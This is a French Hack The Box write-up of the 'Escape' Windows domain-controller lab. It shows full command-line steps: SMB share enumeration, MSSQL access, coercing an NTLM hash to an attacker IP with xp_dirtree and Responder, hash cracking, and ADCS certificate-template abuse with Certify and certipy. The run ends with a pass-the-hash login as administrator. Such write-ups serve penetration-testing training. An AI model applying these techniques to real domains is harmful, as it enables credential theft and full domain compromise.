| Room                                 | Escape                                  |
| ------------------------------------ | --------------------------------------- |
| Url                                  | https://app.hackthebox.com/machines/531 |
| Sujets                               | Windows/AD/ADCS                         |
| Active/Retired lors de la résolution | Retired                                 |
| Difficulté                           | Medium                                  |

---
### Nmap

```bash
pak@kali:~$ nmap -A -p- 10.129.81.126 -Pn  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 14:12 CEST
Nmap scan report for 10.129.81.126
Host is up (0.013s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-14 20:14:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.81.126:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-14T20:11:04
|_Not valid after:  2053-10-14T20:11:04
| ms-sql-ntlm-info: 
|   10.129.81.126:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-14T20:15:37+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-10-14T20:15:37+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-14T20:14:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

```

Nous voyons le nom du domaine, sequel.htb, ainsi que tout les services usuels d'un DC. Pas de web, pas de services particuliers permettant de se frayer un accès ou d'avoir des infos... Mais un MSSQL est tout de même présent, j'imagine que le foothold se fera par là.

On aperçoit aussi l'utilisation de certificat, à voir si ce sera à exploiter quelque-part, je me suis beaucoup renseigné sur le sujet mais je ne l'ai jamais réellement fait, ça peut être intéressant !

Je commence par tenter un enum4linux classique, mais je n'obtiens pas de résultats particulier. Je passe donc sur smbclient pour voir si des partages sont accessibles :

```bash
pak@kali:~$ smbclient -L \\sequel.htb
Password for [WORKGROUP\pak]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share
```

On voit un dossier "Public", donc je tente ma chance, mais sans trop y croire:

```bash
pak@kali:~$ smbclient //sequel.htb/Public
Password for [WORKGROUP\pak]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1444011 blocks available
smb: \>
```

On le récupère :

```bash
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (254.7 KiloBytes/sec) (average 254.7 KiloBytes/sec)
```

![Pasted image 20240222164716](../../../Files/Pasted%20image%2020240222164716.png)

Ok ! Je me prépare une petite wordlist d'utilisateur avec les noms présents dans le document, ça peut servir. On voit aussi des creds pour l'accès au mssql, ils ne doivent pas avoir énormément de droits mais bon, on a quelque-chose :).

---
### Exploitation

On tente de se connecter à mssql:

```bash
pak@kali:~$ impacket-mssqlclient PublicUser@sequel.htb
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

On est connectés o/ !
Mais on n'a accès à pas grand chose. Un MsSQL vide, rien que du très classique. 

```bash
SQL (PublicUser  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1 



SQL (PublicUser  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   

guest                public     NULL        NULL        guest           b'2         '   b'00'   

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   

sys                  public     NULL        NULL        NULL            b'4         '    NULL 



SQL (PublicUser  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------  


SQL (PublicUser  guest@msdb)> enable_xp_cmdshell
[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.


```

Par contre, xp_dirtree donctionne, on va donc lancer l'ami responder :).

```bash
SQL (PublicUser  guest@msdb)> xp_dirtree \\10.10.16.35\truc
subdirectory   depth   file   
------------   -----   ----   

```

La réponse ne se fait pas attendre :

```bash
SMB] NTLMv2-SSP Client   : 10.129.81.126
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
```

Okay, on a maintenant un user sql_svc et son hash ! Ne reste plus qu'à prier pour qu'on puisse le cracker sans trop de problème :).

```bash
pak@kali:~$ hashcat 'sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000' /usr/share/wordlists/rockyou.txt.gz
```

```bash
SQL_SVC::sequel:a6a02dbbac9d28d3:ecbb0b14caa499f1c21be0f8105b7c71:010100000000000080ec7f76aefed9011938b2aee6d4806800000000020008003500510052004a0001001e00570049004e002d004200580055004c00330034004400470036005a00330004003400570049004e002d004200580055004c00330034004400470036005a0033002e003500510052004a002e004c004f00430041004c00030014003500510052004a002e004c004f00430041004c00050014003500510052004a002e004c004f00430041004c000700080080ec7f76aefed90106000400020000000800300030000000000000000000000000300000a401ad8efee268390cff1d1727512d9d2310cab5e65eeedb97c2684acbf859020a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330035000000000000000000:REGGIE1234ronnie
```

Et voilà de nouveaux creds ! **sql_svc:REGGIE1234ronnie**, impeccable. On a vu pendant le nmap qu'il était possible de se connecter via winrm. Aller, ça se tente.

```bash
pak@kali:~$ evil-winrm -i sequel.htb -u "sql_svc" -p "REGGIE1234ronnie"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /all

USER INFORMATION                                                                                                                           
----------------                                                                                                                            
User Name      SID                                                                                                                        
============== ==============================================                                                                              
sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106                           

GROUP INFORMATION                                                            
-----------------                                                                       
Group Name                                  Type             SID          Attributes                                                       
=========================================== ================ ============ ==================================================               
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group               
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group               
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

Et à partir de là, j'ai un peu galéré à avancer... Notre utilisateur ne semble pas avoir de droits particulier à première vue, winpeas ne m'a pas spécialement aidé autrement qu'en confirmant l'utilisation de certificat (mais rien de trouvable avec cet utilisateur). J'ai tenté d'énumérer des users kerberoastables mais rien de concluant non plus. 

Bon, je tourne un peu dans le système "à la mano", à la recherche de trucs intéressants... Jusqu'à tomber sur ce fichier:

```powershell
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
```

On y trouve notamment cette ligne : 
```
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

On imagine donc que le password de 'sequel.htb\Ryan.Cooper' puisse être 'NuclearMosquito3'.

```bash
pak@kali:~$ crackmapexec winrm sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3'
SMB         dc.sequel.htb   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        dc.sequel.htb   5985   DC               [*] http://dc.sequel.htb:5985/wsman
WINRM       dc.sequel.htb   5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)

```

Let's go ! On se connecte, et on a enfin le flag utilisateur :). Je retente un peu d'énumération au cas où, mais je ne trouve rien de particulier. C'est là que je me souviens de l'utilisation des certificats ! Tentons !

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:09.2906146
```

Donc, on a effectivement un certificat qui est vulnérable : on devrait pouvoir request ce certificat sous le nom de l'administrateur et pouvoir faire quelque-chose :).

Et en fait ça ne marche pas. Pourquoi ? Parce-qu'il faut que la date et l'heure soient synchronisés au DC ! Une galère de comprendre le problème.

```bash
pak@kali:~$ sudo ntpdate -u dc.sequel.htb
2023-10-14 23:48:42.383269 (+0200) +28799.624267 +/- 0.006328 dc.sequel.htb 10.129.81.126 s1 no-leap
CLOCK: time stepped by 28799.624267
```

```bash
pak@kali:~$ certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

```bash
pak@kali:~$ certipy-ad auth -pfx administrator.pfx
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee

```

On a le hash admin, plus qu'à aller récupérer le flag :) !

```bash
pak@kali:~$ crackmapexec smb sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee' -X 'type C:\Users\administrator\Desktop\root.txt'
SMB         dc.sequel.htb   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         dc.sequel.htb   445    DC               [+] sequel.htb\administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
SMB         dc.sequel.htb   445    DC               [+] Executed command 
SMB         dc.sequel.htb   445    DC               d53dd2e96d89f754ef6011361c07d015

```
